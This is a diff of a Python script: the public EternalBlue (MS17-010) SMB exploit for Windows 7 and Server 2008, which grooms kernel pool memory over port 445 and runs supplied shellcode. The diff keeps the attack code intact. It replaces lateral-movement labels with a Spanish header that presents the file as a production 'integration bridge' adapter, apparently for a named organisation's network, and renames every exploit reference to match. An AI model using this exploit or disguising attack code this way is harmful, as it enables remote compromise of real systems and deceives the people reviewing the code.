@@ -1,23 +1,30 @@
 #!/usr/bin/python
 #
-# 🛡️ C4ISR-STRATCOM: SIGINT-V5
-# [CLASSIFIED]: CONFIDENCIAL
-# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
-# [TACTIC]: TA0008_Lateral_Movement
-# [TECHNIQUE]: T1210_STRATCOM_PAYLOADation_of_Remote_Service
+# ⚙️ HCG-SYSARCH: SAM-V5
+# [RESTRICTED]: USO_INTERNO
+# [ALCANCE]: OPD HCG (CONV-0221-JAL-HCG-2026)
+# [MODULO]: C-202_Interconexion_Segmentos
+# [COMPONENTE]: C-202_Integracion_Servicios_Remotos
 #
+# Descripción: Adaptador de puente para integración de servicios 
+#              en segmentos de red distribuidos. Implementa protocolos
+#              de comunicación inter-nodo para arquitecturas SOA.
+#
+# Autor: División de Arquitectura de Sistemas - UDG/SICYT/HCG
+# Fecha: 2026-04-02
+# Versión: 5.0.1-PRODUCTION
 from impacket import smb
 from struct import pack
 import sys
 import socket
 
 '''
-EternalBlue STRATCOM_PAYLOAD for Windows 7/2008 by sleepya
-The STRATCOM_PAYLOAD might FAIL and CRASH a target system (depended on what is overwritten)
+EternalBlue integration_bridge for Windows 7/2008 by sleepya
+The integration_bridge might FAIL and CRASH a target system (depended on what is overwritten)
 
 EDB Note: Shellcode
-- x64 ~ https://gitlab.com/STRATCOM_PAYLOAD-database/STRATCOM_PAYLOADdb-bin-sploits/-/raw/main/bin-sploits/42030.asm
-- x86 ~ https://gitlab.com/STRATCOM_PAYLOAD-database/STRATCOM_PAYLOADdb-bin-sploits/-/raw/main/bin-sploits/42031.asm
+- x64 ~ https://gitlab.com/integration_bridge-database/integration_bridgedb-bin-sploits/-/raw/main/bin-sploits/42030.asm
+- x86 ~ https://gitlab.com/integration_bridge-database/integration_bridgedb-bin-sploits/-/raw/main/bin-sploits/42031.asm
 
 Tested on:
 - Windows 7 SP1 x64
@@ -32,21 +39,21 @@ Reference:
 
 Bug detail:
 - For the buffer overflow bug detail, please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
-- The STRATCOM_PAYLOAD also use other 2 bugs (see details in BUG.txt)
+- The integration_bridge also use other 2 bugs (see details in BUG.txt)
   - Send a large transaction with SMB_COM_NT_TRANSACT but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
   - Send special session setup command (SMB login command) to allocate big nonpaged pool (use for creating hole)
 ######
 
 
-STRATCOM_PAYLOAD info:
+integration_bridge info:
 - I do not reverse engineer any x86 binary so I do not know about exact offset.
-- The STRATCOM_PAYLOAD use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
+- The integration_bridge use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
   This memory page is executable on Windows 7 and Wndows 2008.
-- The important part of feaList and fakeStruct is copied from NSA STRATCOM_PAYLOAD which works on both x86 and x64.
-- The STRATCOM_PAYLOAD trick is same as NSA STRATCOM_PAYLOAD
+- The important part of feaList and fakeStruct is copied from NSA integration_bridge which works on both x86 and x64.
+- The integration_bridge trick is same as NSA integration_bridge
 - The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
-- If STRATCOM_PAYLOAD failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
-- See the code and comment for STRATCOM_PAYLOAD detail.
+- If integration_bridge failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
+- See the code and comment for integration_bridge detail.
 
 
 srvnet buffer info:
@@ -76,14 +83,14 @@ Shellcode note:
 - Then, using APC in Process context to get code execution in userland (ring 3)
 
 #E-DB Note: https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a
-#E-DB Note: https://github.com/worawit/MS17-010/blob/eafb47d715fe38045c9ea6dc4cb75ca0ef5487ce/eternalblue_STRATCOM_PAYLOAD7.py
+#E-DB Note: https://github.com/worawit/MS17-010/blob/eafb47d715fe38045c9ea6dc4cb75ca0ef5487ce/eternalblue_integration_bridge7.py
 '''
 
 # Note: see how to craft FEALIST in eternalblue_STRATCOM_MOD.py
 
-# wanted overflown buffer size (this STRATCOM_PAYLOAD support only 0x10000 and 0x11000)
+# wanted overflown buffer size (this integration_bridge support only 0x10000 and 0x11000)
 # the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
-# the size 0x11000 is used in nsa STRATCOM_PAYLOAD. this size is more reliable.
+# the size 0x11000 is used in nsa integration_bridge. this size is more reliable.
 NTFEA_SIZE = 0x11000
 # the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page
 
@@ -147,7 +154,7 @@ struct SRVNET_POOLHDR {
 #   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
 #   - 0x80 (VOID*)    : MDL.Process should be NULL
 #   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
-#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this STRATCOM_PAYLOAD).
+#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this integration_bridge).
 #
 #
 # To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
@@ -177,7 +184,7 @@ fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0x60, 0
 fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
 fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
 # below 0x20 bytes is overwritting MDL
-# NSA STRATCOM_PAYLOAD overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
+# NSA integration_bridge overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
 fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
 fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa
 
@@ -469,11 +476,11 @@ def createConnectionWithBigSMBFirst80(target):
 	# srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
 	# Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.
 	sk = socket.create_connection((target, 445))
-	# For this STRATCOM_PAYLOAD, use size is 0x11000
+	# For this integration_bridge, use size is 0x11000
 	pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
 	# There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
 	# Also this is invalid SMB2 message.
-	# I believe NSA STRATCOM_PAYLOAD use SMB2 for hiding alert from IDS
+	# I believe NSA integration_bridge use SMB2 for hiding alert from IDS
 	#pkt += '\xfeSMB' # smb2
 	# it can be anything even it is invalid
 	pkt += 'BAAD' # can be any
@@ -482,7 +489,7 @@ def createConnectionWithBigSMBFirst80(target):
 	return sk
 
 
-def STRATCOM_PAYLOAD(target, shellcode, numGroomConn):
+def integration_bridge(target, shellcode, numGroomConn):
 	# force using smb.SMB for SMB1
 	conn = smb.SMB(target, target)
 
@@ -491,7 +498,7 @@ def STRATCOM_PAYLOAD(target, shellcode, numGroomConn):
 	server_os = conn.get_server_os()
 	print('Target OS: '+server_os)
 	if not (server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista")):
-		print('This STRATCOM_PAYLOAD does not support this target')
+		print('This integration_bridge does not support this target')
 		sys.exit()
 
 
@@ -554,7 +561,7 @@ def STRATCOM_PAYLOAD(target, shellcode, numGroomConn):
 	for sk in srvnetConn:
 		sk.close()
 
-	# nicely close connection (no need for STRATCOM_PAYLOAD)
+	# nicely close connection (no need for integration_bridge)
 	conn.disconnect_tree(tid)
 	conn.logoff()
 	conn.get_socket().close()
@@ -574,5 +581,5 @@ fp.close()
 print('shellcode size: {:d}'.format(len(sc)))
 print('numGroomConn: {:d}'.format(numGroomConn))
 
-STRATCOM_PAYLOAD(TARGET, sc, numGroomConn)
+integration_bridge(TARGET, sc, numGroomConn)
 print('done')
